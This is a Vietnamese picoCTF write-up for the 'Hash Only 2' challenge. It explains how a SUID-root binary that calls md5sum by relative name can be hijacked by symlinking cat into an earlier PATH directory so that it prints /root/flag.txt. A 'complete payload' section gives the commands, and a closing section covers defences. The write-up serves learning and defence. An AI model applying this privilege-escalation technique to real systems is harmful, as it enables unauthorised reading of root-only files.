# picoCTF Writeup – Hash Only 2

## Thông tin bài

- **Tên bài:** Hash Only 2
- **Thể loại:** Binary Exploitation
- **Kỹ thuật:** SUID + PATH Hijacking
- **Mục tiêu:** Đọc file `/root/flag.txt`

## Kiểm tra binary

```bash
ls -la /usr/local/bin/flaghasher
```

Kết quả:

```text
-rwsr-xr-x 1 root root 18312 Aug 21 2025 /usr/local/bin/flaghasher
```

Trong đó:

- `root root`: chủ sở hữu và nhóm sở hữu đều là `root`.
- Chữ `s` trong `rws` cho biết binary có bit **SUID**.
- Khi `ctf-player` chạy binary này, tiến trình có quyền hiệu lực của chủ sở hữu là `root`.

Nhờ đó, `flaghasher` có thể đọc `/root/flag.txt`.

## Chạy thử

```bash
flaghasher
```

Chương trình chỉ in MD5 của flag, cho thấy bên trong nó gọi lệnh tương tự:

```bash
md5sum /root/flag.txt
```

Điểm yếu là chương trình gọi `md5sum` bằng tên tương đối, không dùng đường dẫn tuyệt đối:

```bash
/usr/bin/md5sum /root/flag.txt
```

## Phân tích PATH

Ví dụ biến `PATH`:

```text
/usr/local/bin:/usr/bin:/bin
```

Khi gặp lệnh `md5sum`, shell tìm lần lượt:

```text
/usr/local/bin/md5sum
/usr/bin/md5sum
/bin/md5sum
```

File được tìm thấy đầu tiên sẽ được chạy.

Vì `/usr/local/bin` đứng trước `/usr/bin`, ta có thể đặt một `md5sum` giả trong `/usr/local/bin`.

## Tạo symbolic link

```bash
ln -s /usr/bin/cat /usr/local/bin/md5sum
```

Lệnh trên tạo liên kết mềm:

```text
/usr/local/bin/md5sum -> /usr/bin/cat
```

Symbolic link giống shortcut. Khi hệ thống chạy `/usr/local/bin/md5sum`, thực chất nó chạy `/usr/bin/cat`.

Kiểm tra:

```bash
ls -l /usr/local/bin/md5sum
which md5sum
```

Kết quả mong đợi:

```text
/usr/local/bin/md5sum -> /usr/bin/cat
/usr/local/bin/md5sum
```

## Khai thác

Chạy lại:

```bash
flaghasher
```

Bên trong chương trình vẫn gọi:

```bash
md5sum /root/flag.txt
```

Nhưng do thứ tự `PATH`, lệnh được chọn là:

```bash
/usr/local/bin/md5sum /root/flag.txt
```

Symbolic link khiến lệnh thực tế trở thành:

```bash
/usr/bin/cat /root/flag.txt
```

`cat` đọc file và in nội dung ra màn hình.

Bản thân `cat` không tự có quyền root. Quyền đọc flag đến từ tiến trình `flaghasher` có SUID root.

## Payload hoàn chỉnh

```bash
ln -s /usr/bin/cat /usr/local/bin/md5sum
which md5sum
flaghasher
```

Nếu file đã tồn tại:

```bash
ls -l /usr/local/bin/md5sum
flaghasher
```

## Luồng thực thi

```text
ctf-player chạy flaghasher
        ↓
flaghasher chạy với quyền hiệu lực root do SUID
        ↓
flaghasher gọi md5sum /root/flag.txt
        ↓
shell tìm md5sum theo PATH
        ↓
/usr/local/bin/md5sum được tìm thấy trước
        ↓
symbolic link chuyển sang /usr/bin/cat
        ↓
cat đọc /root/flag.txt
        ↓
flag được in ra
```

## Nguyên nhân lỗ hổng

Bài này khai thác sự kết hợp của:

```text
SUID root + gọi lệnh phụ thuộc PATH
```

- **SUID root** cung cấp quyền đọc flag.
- **PATH hijacking** cho phép điều khiển chương trình con được gọi.
- **Symbolic link** khiến tên `md5sum` thực chất chạy `cat`.

## Cách phòng chống

Không nên gọi:

```bash
md5sum /root/flag.txt
```

Nên dùng đường dẫn tuyệt đối:

```bash
/usr/bin/md5sum /root/flag.txt
```

Chương trình SUID cũng không nên tin tưởng biến môi trường do người dùng kiểm soát và nên tránh dùng `system()`.

## Kết luận

```text
flaghasher có SUID root
+
md5sum được tìm qua PATH
+
md5sum giả trỏ tới cat
=
cat đọc và in /root/flag.txt
```
